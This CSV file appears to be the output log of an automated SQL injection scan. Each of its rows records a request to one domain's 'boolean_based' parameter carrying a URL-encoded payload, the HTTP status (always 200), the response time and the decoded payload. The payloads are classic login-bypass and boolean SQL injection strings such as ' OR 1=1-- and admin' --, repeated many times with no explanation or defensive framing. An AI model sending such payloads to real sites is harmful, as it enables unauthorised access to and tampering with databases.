URL,Status Code,Response Time (s),Payload
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.3368194103240967,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.8424830436706543,admin' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.5225169658660889,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.4665708541870117,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.3293347358703613,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.8880233764648438,admin' #
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.15242934226989746,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.09708833694458,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.444246768951416,1 OR 1=1
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.7267615795135498,admin' #
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.4392979145050049,' OR 1=1 --
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.378248929977417,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.37531280517578125,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.3322679996490479,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.301938533782959,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.8240275382995605,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.3300704956054688,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.3252379894256592,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.784970998764038,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.6033449172973633,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.3408246040344238,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.2943463325500488,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.7824506759643555,admin' #
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.8105545043945312,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.5994937419891357,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.338388442993164,1 OR 1=1
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.4091310501098633,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.40950465202331543,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.2795991897583008,' OR 1=1#
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.9406392574310303,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.8141028881072998,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.6105678081512451,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.2449266910552979,' OR 1=1--
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.5501251220703125,' OR '1'='1
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.6124653816223145,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.48982787132263184,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.3872902393341064,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.7637996673583984,' OR 'x'='x
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.6486725807189941,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.5654230117797852,1 OR 1=1
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.6685538291931152,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.5628283023834229,admin' #
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.5388545989990234,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.6437807083129883,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.4814574718475342,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.3947548866271973,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.3981115818023682,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.328300952911377,admin' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.3441846370697021,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.4603285789489746,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.2980055809020996,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.2987453937530518,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.4598407745361328,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.178748369216919,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.548715353012085,1 OR 1=1
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.3297080993652344,admin' #
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.3110275268554688,admin' #
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.2296562194824219,admin' #
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.4032399654388428,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.1175429821014404,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.40676236152648926,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.40903759002685547,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.40955162048339844,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.0805182456970215,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.37990713119506836,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.3123304843902588,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.1797151565551758,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.1142876148223877,' OR 'x'='x
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.2364768981933594,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.0859589576721191,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.4686927795410156,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.4599945545196533,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.2684214115142822,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.0802531242370605,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.045670509338379,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.0379197597503662,' OR 1=1 --
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.0267255306243896,admin' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.4399831295013428,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.41338419914245605,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.37784767150878906,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.37871861457824707,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.41206979751586914,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.0839471817016602,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.9345433712005615,' OR 1=1--
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.3976151943206787,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.39449477195739746,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.3962059020996094,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.8940236568450928,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.1002438068389893,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.8903181552886963,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.8714590072631836,1 OR 1=1
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.2543907165527344,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.2585461139678955,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.46198034286499023,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.021878957748413,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.8382816314697266,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.2481193542480469,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.8526997566223145,' OR 1=1 --
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.2449216842651367,admin' --
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.8284361362457275,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.9223930835723877,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.738738775253296,' OR 'x'='x
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.9204041957855225,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.1396408081054688,admin' #
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.33830976486206055,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.28191566467285156,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.2819705009460449,1 OR 1=1
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.29911184310913086,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.30364060401916504,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.30002450942993164,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.3033013343811035,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.29773998260498047,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.29018616676330566,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.29955315589904785,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.3019218444824219,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.8942551612854004,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.2064130306243896,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.9418258666992188,admin' --
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.32140254974365234,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.3219013214111328,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.3225419521331787,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.3307945728302002,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.3328733444213867,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.3334944248199463,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.9141077995300293,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.4665544033050537,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.2990412712097168,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.30057621002197266,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.3062434196472168,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.9088685512542725,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.9037027359008789,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.6461436748504639,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.9036569595336914,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.6488194465637207,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.9052393436431885,' OR 'x'='x
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.38349151611328125,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.4053807258605957,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.40697240829467773,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.27446460723876953,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.4052248001098633,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.3058454990386963,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.8598260879516602,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.2466466426849365,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.147542953491211,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.9026401042938232,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.8604187965393066,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.2232847213745117,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.8779346942901611,' OR 'x'='x
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.20930790901184082,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.21589231491088867,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.27177906036376953,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.2290782928466797,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.21369528770446777,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.34059572219848633,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.36244797706604004,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.1832129955291748,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.8474838733673096,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.1703557968139648,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.8350975513458252,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.8276417255401611,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.166947603225708,' OR 1=1 --
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.8122928142547607,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.0124871730804443,' OR 1=1 --
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.18291091918945312,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.20698213577270508,admin' #
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.1113831996917725,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.18848657608032227,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.18856549263000488,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.1913161277770996,admin' --
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.26177144050598145,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.9427835941314697,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.28519177436828613,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.2853546142578125,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.9710037708282471,admin' #
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.270277738571167,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.2708408832550049,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.27044105529785156,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.9173004627227783,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.9826908111572266,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.9370973110198975,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.3215656280517578,admin' --
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.3232874870300293,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.3314023017883301,' OR 1=1 --
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.347827672958374,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.35059332847595215,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.8849518299102783,admin' #
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.37868595123291016,' OR 1=1 --
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.9128365516662598,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.5211851596832275,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.3932220935821533,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.5509090423583984,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.39744114875793457,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.539661169052124,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.3918910026550293,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.3936042785644531,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.862818717956543,1 OR 1=1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.35619544982910156,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.0794732570648193,' OR 'x'='x
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.3470909595489502,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.37806034088134766,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.34401702880859375,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.34629297256469727,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.36974120140075684,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.4153883457183838,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.37610554695129395,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.3433525562286377,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.4989900588989258,1 OR 1=1
